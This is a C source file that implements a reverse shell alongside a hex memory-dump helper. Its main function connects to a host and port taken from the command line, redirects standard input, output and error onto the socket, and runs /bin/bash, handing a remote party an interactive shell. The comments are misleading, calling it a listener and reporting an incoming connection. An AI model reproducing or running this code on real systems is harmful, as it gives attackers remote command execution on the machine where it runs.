#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "include/yiwen_fatal.h"
#include "include/yiwen_memview.h"
#include "include/yiwen_int.h"

extern char int_prompt[];
extern char *cmd_args;
extern char *cmd_token;
extern char cmd_line[];

void memDump(char *desc, void *addr, int len) {
    int i;
    unsigned char buff[17];
    unsigned char *ptr = (unsigned char*)addr;

    if (desc != NULL)
        printf ("%s:\n", desc);
    for (i = 0; i < len; i++) {
        if ((i % 16) == 0) {
            if (i != 0)
                printf(" | %s\n", buff);
            printf(" %04x |", i);
        }
        printf(" %02x", ptr[i]);
        if ((ptr[i] < 0x20) || (ptr[i] > 0x7e)) {
            buff[i % 16] = '.';
        } else {
            buff[i % 16] = ptr[i];
        }
        buff[(i % 16) + 1] = '\0';
    }
    while ((i % 16) != 0) {
        printf("   ");
        i++;
    }
    printf(" | %s\n", buff);
}

int main(int argc, char **argv)
{
    if (argc != 3 ){
        printf("Usage\n  <%s> <HOST> <PORT>\n", argv[0]);
        return -1;
    }

    // Create listener
	int sockfd;  // listen on sock_fd, new connection on new_fd
	struct sockaddr_in client_addr;	// my address information
	socklen_t sin_size;
	int recv_length=1, yes=1;
	char buffer[1024];

	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		fatal("in socket");
	client_addr.sin_family = AF_INET;		 // host byte order
	client_addr.sin_addr.s_addr = inet_addr(argv[1]); // automatically fill with my IP
	client_addr.sin_port = htons(atoi(argv[2]));	 // short, network byte order
	memset(&(client_addr.sin_zero), '\0', 8); // zero the rest of the struct

    if (connect(sockfd, (struct sockaddr*)&client_addr, sizeof(struct sockaddr)) == -1)
        fatal("listening on socket");

    printf("server: got connection from %s port %d\n",inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execve("/bin/bash", 0, 0);

    /* char *buff; */
    /* size_t size = 0; */
    /* ssize_t nread = 0; */
    /* while((nread = getline(&buff, &size, stdin)) != -1){ */
    /*     printf("%s", buff); */
    /* } */

    /* free(buff); */

    return 0;
}
